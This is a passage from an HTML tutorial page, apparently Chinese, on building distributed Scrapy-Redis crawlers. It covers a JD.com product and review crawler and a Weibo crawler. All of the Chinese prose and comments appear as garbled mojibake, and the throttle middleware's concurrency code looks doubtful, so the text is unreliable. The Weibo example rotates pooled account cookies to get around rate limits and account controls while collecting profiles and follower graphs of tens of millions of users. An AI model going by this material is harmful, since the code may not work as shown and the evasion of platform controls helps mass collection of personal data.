            <span class="n">item</span><span class="p">[</span><span class="s1">&#39;good_rate&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;productCommentSummary&#39;</span><span class="p">,</span> <span class="p">{})</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;goodRate&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
            <span class="n">item</span><span class="p">[</span><span class="s1">&#39;good_count&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;productCommentSummary&#39;</span><span class="p">,</span> <span class="p">{})</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;goodCount&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="n">item</span><span class="p">[</span><span class="s1">&#39;comment_count&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>
            <span class="n">item</span><span class="p">[</span><span class="s1">&#39;good_rate&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>
            <span class="n">item</span><span class="p">[</span><span class="s1">&#39;good_count&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>

        <span class="k">yield</span> <span class="n">item</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">extract_product_id</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ä» URL ä¸­æå–å•†å“ ID&quot;&quot;&quot;</span>
        <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;/(\d+)\.html&#39;</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="k">if</span> <span class="n">match</span> <span class="k">else</span> <span class="s1">&#39;&#39;</span>
</code></pre>
      </div>

      <p><strong>pipelines.py æ•°æ®å¤„ç†</strong>ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">pymongo</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">itemadapter</span><span class="w"> </span><span class="kn">import</span> <span class="n">ItemAdapter</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">datetime</span><span class="w"> </span><span class="kn">import</span> <span class="n">datetime</span>

<span class="k">class</span><span class="w"> </span><span class="nc">MongoDBPipeline</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;MongoDB å­˜å‚¨ Pipeline&quot;&quot;&quot;</span>

    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">mongo_uri</span><span class="p">,</span> <span class="n">mongo_db</span><span class="p">,</span> <span class="n">mongo_collection</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">mongo_uri</span> <span class="o">=</span> <span class="n">mongo_uri</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">mongo_db</span> <span class="o">=</span> <span class="n">mongo_db</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">mongo_collection</span> <span class="o">=</span> <span class="n">mongo_collection</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">client</span> <span class="o">=</span> <span class="kc">None</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">db</span> <span class="o">=</span> <span class="kc">None</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">collection</span> <span class="o">=</span> <span class="kc">None</span>

    <span class="nd">@classmethod</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">from_crawler</span><span class="p">(</span><span class="bp">cls</span><span class="p">,</span> <span class="n">crawler</span><span class="p">):</span>
        <span class="k">return</span> <span class="bp">cls</span><span class="p">(</span>
            <span class="n">mongo_uri</span><span class="o">=</span><span class="n">crawler</span><span class="o">.</span><span class="n">settings</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;MONGODB_URI&#39;</span><span class="p">),</span>
            <span class="n">mongo_db</span><span class="o">=</span><span class="n">crawler</span><span class="o">.</span><span class="n">settings</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;MONGODB_DATABASE&#39;</span><span class="p">),</span>
            <span class="n">mongo_collection</span><span class="o">=</span><span class="n">crawler</span><span class="o">.</span><span class="n">settings</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;MONGODB_COLLECTION&#39;</span><span class="p">)</span>
        <span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">open_spider</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">spider</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">client</span> <span class="o">=</span> <span class="n">pymongo</span><span class="o">.</span><span class="n">MongoClient</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">mongo_uri</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">db</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">client</span><span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">mongo_db</span><span class="p">]</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">collection</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">db</span><span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">mongo_collection</span><span class="p">]</span>

        <span class="c1"># åˆ›å»ºç´¢å¼•</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">collection</span><span class="o">.</span><span class="n">create_index</span><span class="p">(</span><span class="s1">&#39;product_id&#39;</span><span class="p">,</span> <span class="n">unique</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">collection</span><span class="o">.</span><span class="n">create_index</span><span class="p">(</span><span class="s1">&#39;crawl_time&#39;</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">close_spider</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">spider</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">client</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">process_item</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">item</span><span class="p">,</span> <span class="n">spider</span><span class="p">):</span>
        <span class="n">item_dict</span> <span class="o">=</span> <span class="n">ItemAdapter</span><span class="p">(</span><span class="n">item</span><span class="p">)</span><span class="o">.</span><span class="n">asdict</span><span class="p">()</span>
        <span class="n">item_dict</span><span class="p">[</span><span class="s1">&#39;crawl_time&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span>

        <span class="c1"># ä½¿ç”¨ upsert é¿å…é‡å¤</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">collection</span><span class="o">.</span><span class="n">update_one</span><span class="p">(</span>
            <span class="p">{</span><span class="s1">&#39;product_id&#39;</span><span class="p">:</span> <span class="n">item_dict</span><span class="p">[</span><span class="s1">&#39;product_id&#39;</span><span class="p">]},</span>
            <span class="p">{</span><span class="s1">&#39;$set&#39;</span><span class="p">:</span> <span class="n">item_dict</span><span class="p">},</span>
            <span class="n">upsert</span><span class="o">=</span><span class="kc">True</span>
        <span class="p">)</span>

        <span class="n">spider</span><span class="o">.</span><span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Item saved: </span><span class="si">{</span><span class="n">item_dict</span><span class="p">[</span><span class="s2">&quot;title&quot;</span><span class="p">]</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">item</span>
</code></pre>
      </div>

      <h4 id="éƒ¨ç½²å’Œè¿è¡Œ">éƒ¨ç½²å’Œè¿è¡Œ</h4>

      <p><strong>1. å¯åŠ¨ Redis ä¸»èŠ‚ç‚¹ï¼ˆMasterï¼‰</strong>ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># åœ¨ Master æœåŠ¡å™¨ä¸Šå¯åŠ¨ Redis</span>
redis-server<span class="w"> </span>/etc/redis/redis.conf

<span class="c1"># é…ç½® Redis æŒä¹…åŒ–</span>
<span class="c1"># åœ¨ redis.conf ä¸­è®¾ç½®ï¼š</span>
<span class="c1"># save 900 1</span>
<span class="c1"># save 300 10</span>
<span class="c1"># save 60 10000</span>
<span class="c1"># appendonly yes</span>
</code></pre>
      </div>

      <p><strong>2. å¯åŠ¨çˆ¬è™«èŠ‚ç‚¹ï¼ˆSlaveï¼‰</strong>ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># åœ¨ Slave 1 æœåŠ¡å™¨ä¸Š</span>
<span class="nb">cd</span><span class="w"> </span>/path/to/jd_crawler
scrapy<span class="w"> </span>crawl<span class="w"> </span>jd

<span class="c1"># åœ¨ Slave 2 æœåŠ¡å™¨ä¸Š</span>
<span class="nb">cd</span><span class="w"> </span>/path/to/jd_crawler
scrapy<span class="w"> </span>crawl<span class="w"> </span>jd

<span class="c1"># åœ¨ Slave 3 æœåŠ¡å™¨ä¸Š</span>
<span class="nb">cd</span><span class="w"> </span>/path/to/jd_crawler
scrapy<span class="w"> </span>crawl<span class="w"> </span>jd

<span class="c1"># åœ¨ Slave 4 æœåŠ¡å™¨ä¸Š</span>
<span class="nb">cd</span><span class="w"> </span>/path/to/jd_crawler
scrapy<span class="w"> </span>crawl<span class="w"> </span>jd
</code></pre>
      </div>

      <p><strong>3. æ·»åŠ èµ·å§‹ URL</strong>ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># æ‰¹é‡æ·»åŠ å›¾ä¹¦åˆ†ç±»èµ·å§‹ URL</span>
redis-cli<span class="w"> </span>-h<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-a<span class="w"> </span>your_redis_password<span class="w"> </span><span class="s">&lt;&lt; EOF</span>
<span class="s">lpush jd:start_urls &quot;https://list.jd.com/list.html?cat=1713,3258,3274&quot;</span>
<span class="s">lpush jd:start_urls &quot;https://list.jd.com/list.html?cat=1713,3258,9435&quot;</span>
<span class="s">lpush jd:start_urls &quot;https://list.jd.com/list.html?cat=1713,3258,9438&quot;</span>
<span class="s">EOF</span>
</code></pre>
      </div>

      <p><strong>4. ç›‘æ§çˆ¬å–çŠ¶æ€</strong>ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># monitor.py - å®æ—¶ç›‘æ§è„šæœ¬</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">redis</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">redis</span><span class="o">.</span><span class="n">Redis</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;192.168.1.100&#39;</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s1">&#39;your_redis_password&#39;</span><span class="p">,</span> <span class="n">decode_responses</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>

<span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
    <span class="n">queue_size</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">llen</span><span class="p">(</span><span class="s1">&#39;jd:requests&#39;</span><span class="p">)</span>
    <span class="n">dupefilter_size</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">scard</span><span class="p">(</span><span class="s1">&#39;jd:dupefilter&#39;</span><span class="p">)</span>

    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[</span><span class="si">{</span><span class="n">time</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s2">&quot;%Y-%m-</span><span class="si">%d</span><span class="s2"> %H:%M:%S&quot;</span><span class="p">)</span><span class="si">}</span><span class="s1">]&#39;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;  å¾…çˆ¬å–é˜Ÿåˆ—: </span><span class="si">{</span><span class="n">queue_size</span><span class="si">:</span><span class="s1">,</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;  å·²å»é‡URL: </span><span class="si">{</span><span class="n">dupefilter_size</span><span class="si">:</span><span class="s1">,</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;  é¢„è®¡å‰©ä½™æ—¶é—´: </span><span class="si">{</span><span class="n">queue_size</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="p">(</span><span class="mi">64</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">5</span><span class="p">)</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mi">60</span><span class="si">:</span><span class="s1">.1f</span><span class="si">}</span><span class="s1"> åˆ†é’Ÿ&#39;</span><span class="p">)</span>  <span class="c1"># å‡è®¾æ¯ç§’ 5 ä¸ªè¯·æ±‚/èŠ‚ç‚¹</span>
    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;-&#39;</span> <span class="o">*</span> <span class="mi">50</span><span class="p">)</span>

    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span>
</code></pre>
      </div>

      <h4 id="å…³é”®ä¼˜åŒ–ç‚¹">å…³é”®ä¼˜åŒ–ç‚¹</h4>

      <p><strong>1. åˆ†å±‚çˆ¬å–ç­–ç•¥</strong>ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># åˆ—è¡¨é¡µä¼˜å…ˆçº§é«˜ï¼Œè¯¦æƒ…é¡µä¼˜å…ˆçº§ä½</span>
<span class="k">class</span><span class="w"> </span><span class="nc">JDSpider</span><span class="p">(</span><span class="n">RedisSpider</span><span class="p">):</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">parse</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">response</span><span class="p">):</span>
        <span class="c1"># åˆ—è¡¨é¡µé“¾æ¥ï¼Œé«˜ä¼˜å…ˆçº§</span>
        <span class="k">for</span> <span class="n">link</span> <span class="ow">in</span> <span class="n">product_links</span><span class="p">:</span>
            <span class="k">yield</span> <span class="n">scrapy</span><span class="o">.</span><span class="n">Request</span><span class="p">(</span>
                <span class="n">link</span><span class="p">,</span>
                <span class="n">callback</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">parse_product_detail</span><span class="p">,</span>
                <span class="n">priority</span><span class="o">=</span><span class="mi">1</span>  <span class="c1"># è¯¦æƒ…é¡µä½ä¼˜å…ˆçº§</span>
            <span class="p">)</span>

        <span class="c1"># ç¿»é¡µé“¾æ¥ï¼Œæœ€é«˜ä¼˜å…ˆçº§</span>
        <span class="k">if</span> <span class="n">next_page</span><span class="p">:</span>
            <span class="k">yield</span> <span class="n">response</span><span class="o">.</span><span class="n">follow</span><span class="p">(</span>
                <span class="n">next_page</span><span class="p">,</span>
                <span class="n">callback</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">parse</span><span class="p">,</span>
                <span class="n">priority</span><span class="o">=</span><span class="mi">10</span>  <span class="c1"># åˆ—è¡¨é¡µé«˜ä¼˜å…ˆçº§</span>
            <span class="p">)</span>
</code></pre>
      </div>

      <p><strong>2. å¢é‡æ›´æ–°ç­–ç•¥</strong>ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="k">class</span><span class="w"> </span><span class="nc">MongoDBPipeline</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">process_item</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">item</span><span class="p">,</span> <span class="n">spider</span><span class="p">):</span>
        <span class="c1"># æ£€æŸ¥æ˜¯å¦éœ€è¦æ›´æ–°</span>
        <span class="n">existing</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">collection</span><span class="o">.</span><span class="n">find_one</span><span class="p">({</span><span class="s1">&#39;product_id&#39;</span><span class="p">:</span> <span class="n">item_dict</span><span class="p">[</span><span class="s1">&#39;product_id&#39;</span><span class="p">]})</span>

        <span class="k">if</span> <span class="n">existing</span><span class="p">:</span>
            <span class="c1"># è®¡ç®—ä»·æ ¼å˜åŒ–</span>
            <span class="n">old_price</span> <span class="o">=</span> <span class="nb">float</span><span class="p">(</span><span class="n">existing</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;price&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
            <span class="n">new_price</span> <span class="o">=</span> <span class="nb">float</span><span class="p">(</span><span class="n">item_dict</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;price&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>

            <span class="k">if</span> <span class="nb">abs</span><span class="p">(</span><span class="n">old_price</span> <span class="o">-</span> <span class="n">new_price</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mf">0.01</span><span class="p">:</span>
                <span class="c1"># ä»·æ ¼æœ‰å˜åŒ–ï¼Œè®°å½•å†å²</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">collection</span><span class="o">.</span><span class="n">update_one</span><span class="p">(</span>
                    <span class="p">{</span><span class="s1">&#39;product_id&#39;</span><span class="p">:</span> <span class="n">item_dict</span><span class="p">[</span><span class="s1">&#39;product_id&#39;</span><span class="p">]},</span>
                    <span class="p">{</span>
                        <span class="s1">&#39;$set&#39;</span><span class="p">:</span> <span class="n">item_dict</span><span class="p">,</span>
                        <span class="s1">&#39;$push&#39;</span><span class="p">:</span> <span class="p">{</span>
                            <span class="s1">&#39;price_history&#39;</span><span class="p">:</span> <span class="p">{</span>
                                <span class="s1">&#39;price&#39;</span><span class="p">:</span> <span class="n">new_price</span><span class="p">,</span>
                                <span class="s1">&#39;time&#39;</span><span class="p">:</span> <span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span>
                            <span class="p">}</span>
                        <span class="p">}</span>
                    <span class="p">}</span>
                <span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="c1"># æ–°å•†å“ï¼Œç›´æ¥æ’å…¥</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">collection</span><span class="o">.</span><span class="n">insert_one</span><span class="p">(</span><span class="n">item_dict</span><span class="p">)</span>
</code></pre>
      </div>

      <p><strong>3. æ™ºèƒ½é™é€Ÿ</strong>ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="k">class</span><span class="w"> </span><span class="nc">AutoThrottleMiddleware</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;æ ¹æ®æœåŠ¡å™¨å“åº”åŠ¨æ€è°ƒæ•´è¯·æ±‚é€Ÿåº¦&quot;&quot;&quot;</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">process_response</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">response</span><span class="p">,</span> <span class="n">spider</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status</span> <span class="o">==</span> <span class="mi">429</span><span class="p">:</span>  <span class="c1"># Too Many Requests</span>
            <span class="c1"># æ£€æµ‹åˆ°é™é€Ÿï¼Œé™ä½é€Ÿåº¦</span>
            <span class="n">spider</span><span class="o">.</span><span class="n">crawler</span><span class="o">.</span><span class="n">engine</span><span class="o">.</span><span class="n">downloader</span><span class="o">.</span><span class="n">total_concurrency</span><span class="o">.</span><span class="n">value</span> <span class="o">-=</span> <span class="mi">5</span>
            <span class="n">spider</span><span class="o">.</span><span class="n">logger</span><span class="o">.</span><span class="n">warning</span><span class="p">(</span><span class="s1">&#39;Detected rate limiting, reducing concurrency&#39;</span><span class="p">)</span>
        <span class="k">elif</span> <span class="n">response</span><span class="o">.</span><span class="n">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
            <span class="c1"># æ­£å¸¸å“åº”ï¼Œå¯ä»¥é€‚å½“æé€Ÿ</span>
            <span class="n">current</span> <span class="o">=</span> <span class="n">spider</span><span class="o">.</span><span class="n">crawler</span><span class="o">.</span><span class="n">engine</span><span class="o">.</span><span class="n">downloader</span><span class="o">.</span><span class="n">total_concurrency</span><span class="o">.</span><span class="n">value</span>
            <span class="k">if</span> <span class="n">current</span> <span class="o">&lt;</span> <span class="mi">64</span><span class="p">:</span>
                <span class="n">spider</span><span class="o">.</span><span class="n">crawler</span><span class="o">.</span><span class="n">engine</span><span class="o">.</span><span class="n">downloader</span><span class="o">.</span><span class="n">total_concurrency</span><span class="o">.</span><span class="n">value</span> <span class="o">+=</span> <span class="mi">1</span>

        <span class="k">return</span> <span class="n">response</span>
</code></pre>
      </div>

      <h4 id="å®é™…æ•ˆæœ">å®é™…æ•ˆæœ</h4>

      <p><strong>çˆ¬å–ç»Ÿè®¡ï¼ˆ30 å¤©è¿è¡Œæ•°æ®ï¼‰</strong>ï¼š</p>

      <ul>
        <li><strong>æ€»å•†å“æ•°</strong>ï¼š5,247,893 ä»¶</li>
        <li><strong>æ€»è¯„è®ºæ•°</strong>ï¼š128,562,417 æ¡</li>
        <li><strong>å¹³å‡çˆ¬å–é€Ÿåº¦</strong>ï¼š320 å•†å“/åˆ†é’Ÿ</li>
        <li><strong>é”™è¯¯ç‡</strong>ï¼š&lt; 0.5%</li>
        <li><strong>é‡å¤ç‡</strong>ï¼š&lt; 0.01%ï¼ˆBloom Filter è¯¯åˆ¤ç‡ï¼‰</li>
        <li><strong>æ•°æ®å®Œæ•´æ€§</strong>ï¼š&gt; 99.5%</li>
      </ul>

      <p><strong>æˆæœ¬åˆ†æ</strong>ï¼š</p>

      <ul>
        <li><strong>æœåŠ¡å™¨æˆæœ¬</strong>ï¼š1 å° Masterï¼ˆ4æ ¸8Gï¼‰+ 4 å° Slaveï¼ˆ2æ ¸4Gï¼‰</li>
        <li><strong>å­˜å‚¨æˆæœ¬</strong>ï¼šMongoDB é›†ç¾¤ 500GBï¼ˆå«è¯„è®ºæ•°æ®ï¼‰</li>
        <li><strong>ç½‘ç»œå¸¦å®½</strong>ï¼šæ¯èŠ‚ç‚¹ 10Mbpsï¼Œæ€»è®¡ 40Mbps</li>
        <li><strong>æœˆåº¦æˆæœ¬</strong>ï¼šçº¦ $800ï¼ˆäº‘æœåŠ¡å™¨ï¼‰</li>
      </ul>

      <p><strong>å‚è€ƒæ¥æº</strong>ï¼š</p>

      <ul>
        <li><a href="https://blog.csdn.net/weixin_52392194/article/details/141000827">åƒä¸‡çº§åˆ†å¸ƒå¼çˆ¬è™«ï¼šScrapy-Redis æ·±å…¥è§£æ</a>
        </li>
        <li><a href="https://zhuanlan.zhihu.com/p/28926308">äº¬ä¸œåˆ†å¸ƒå¼çˆ¬è™«å®è·µã€æ¶æ„ã€æºç </a></li>
        <li><a href="https://www.imooc.com/article/48414">Scrapy+Redis+MySQL åˆ†å¸ƒå¼çˆ¬å–å•†å“ä¿¡æ¯</a></li>
      </ul>

      <h3 id="ç¤ºä¾‹4çœŸå®æ¡ˆä¾‹-æ–°æµªå¾®åšç”¨æˆ·ä¿¡æ¯çˆ¬è™«">ç¤ºä¾‹4ï¼šçœŸå®æ¡ˆä¾‹ - æ–°æµªå¾®åšç”¨æˆ·ä¿¡æ¯çˆ¬è™«</h3>

      <p><strong>é¡¹ç›®èƒŒæ™¯</strong>ï¼šé‡‡é›†æ–°æµªå¾®åšç”¨æˆ·çš„ä¸ªäººä¿¡æ¯ã€å¾®åšå†…å®¹ã€ç²‰ä¸å’Œå…³æ³¨å…³ç³»ï¼Œç”¨äºç¤¾äº¤ç½‘ç»œåˆ†æã€‚</p>

      <p><strong>æŠ€æœ¯æ ˆ</strong>ï¼šScrapy + Scrapy-Redis + MongoDB + Graphiteï¼ˆç›‘æ§ï¼‰</p>

      <p><strong>æ€§èƒ½æ•°æ®</strong>ï¼š</p>

      <ul>
        <li><strong>ç”¨æˆ·è§„æ¨¡</strong>ï¼š2000 ä¸‡+ ç”¨æˆ·</li>
        <li><strong>å¾®åšæ•°é‡</strong>ï¼š5 äº¿+ æ¡å¾®åš</li>
        <li><strong>çˆ¬å–å‘¨æœŸ</strong>ï¼šæŒç»­è¿è¡Œ 3 ä¸ªæœˆ</li>
        <li><strong>å¹³å‡é€Ÿåº¦</strong>ï¼šçº¦ 150 ç”¨æˆ·/åˆ†é’Ÿ</li>
        <li><strong>å­˜å‚¨å¤§å°</strong>ï¼šMongoDB é›†ç¾¤ 2TB+</li>
      </ul>

      <p><strong>æ ¸å¿ƒæŒ‘æˆ˜</strong>ï¼š</p>

      <ol>
        <li><strong>åçˆ¬è™«å¯¹æŠ—</strong>ï¼šå¾®åšæœ‰ä¸¥æ ¼çš„è®¿é—®é¢‘ç‡é™åˆ¶å’Œè´¦å·é£æ§</li>
        <li><strong>å…³ç³»ç½‘ç»œå¤æ‚</strong>ï¼šéœ€è¦å¤„ç†ç”¨æˆ·ä¹‹é—´çš„å…³æ³¨/ç²‰ä¸å…³ç³»</li>
        <li><strong>æ•°æ®é‡å·¨å¤§</strong>ï¼šéœ€è¦é«˜æ•ˆçš„å­˜å‚¨å’Œå»é‡æ–¹æ¡ˆ</li>
      </ol>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># ä½¿ç”¨è´¦å·æ± è½®æ¢</span>
<span class="k">class</span><span class="w"> </span><span class="nc">WeiboSpider</span><span class="p">(</span><span class="n">RedisSpider</span><span class="p">):</span>
    <span class="n">name</span> <span class="o">=</span> <span class="s1">&#39;weibo&#39;</span>

    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
        <span class="nb">super</span><span class="p">()</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">account_pool</span> <span class="o">=</span> <span class="n">AccountPool</span><span class="p">()</span>  <span class="c1"># è´¦å·æ± ç®¡ç†</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">start_requests</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="c1"># ä»è´¦å·æ± è·å– cookie</span>
        <span class="n">cookies</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">account_pool</span><span class="o">.</span><span class="n">get_cookie</span><span class="p">()</span>
        <span class="k">for</span> <span class="n">url</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">start_urls</span><span class="p">:</span>
            <span class="k">yield</span> <span class="n">scrapy</span><span class="o">.</span><span class="n">Request</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">parse_user</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">response</span><span class="p">):</span>
        <span class="c1"># è§£æç”¨æˆ·ä¿¡æ¯</span>
        <span class="n">user_item</span> <span class="o">=</span> <span class="n">UserItem</span><span class="p">()</span>
        <span class="n">user_item</span><span class="p">[</span><span class="s1">&#39;uid&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">meta</span><span class="p">[</span><span class="s1">&#39;uid&#39;</span><span class="p">]</span>
        <span class="n">user_item</span><span class="p">[</span><span class="s1">&#39;nickname&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">css</span><span class="p">(</span><span class="s1">&#39;div.name::text&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">get</span><span class="p">()</span>
        <span class="c1"># ... å…¶ä»–å­—æ®µ</span>

        <span class="k">yield</span> <span class="n">user_item</span>

        <span class="c1"># çˆ¬å–ç²‰ä¸å’Œå…³æ³¨</span>
        <span class="n">followers_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;https://weibo.com/ajax/friendships/followers?uid=</span><span class="si">{</span><span class="n">uid</span><span class="si">}</span><span class="s1">&#39;</span>
        <span class="k">yield</span> <span class="n">scrapy</span><span class="o">.</span><span class="n">Request</span><span class="p">(</span><span class="n">followers_url</span><span class="p">,</span> <span class="n">callback</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">parse_followers</span><span class="p">)</span>
</code></pre>
      </div>

      <p><strong>å‚è€ƒæ¥æº</strong>ï¼š</p>

      <ul>
        <li><a href="https://zhuanlan.zhihu.com/p/25172216">Python çˆ¬è™«å®æˆ˜é¡¹ç›®ä»£ç å¤§å…¨</a></li>
        <li><a href="https://gitee.com/alienwu/WebCrawlProject">WebCrawlProjectï¼šçœŸå®çˆ¬è™«é¡¹ç›®é›†åˆ</a></li>
      </ul>

      <hr />

      <h2 id="æœ€ä½³å®è·µ">æœ€ä½³å®è·µ</h2>

      <h3 id="1-æ¶æ„è®¾è®¡">1. æ¶æ„è®¾è®¡</h3>

      <p><strong>æ¨èæ¶æ„ç»„ä»¶ï¼š</strong></p>

      <ul>
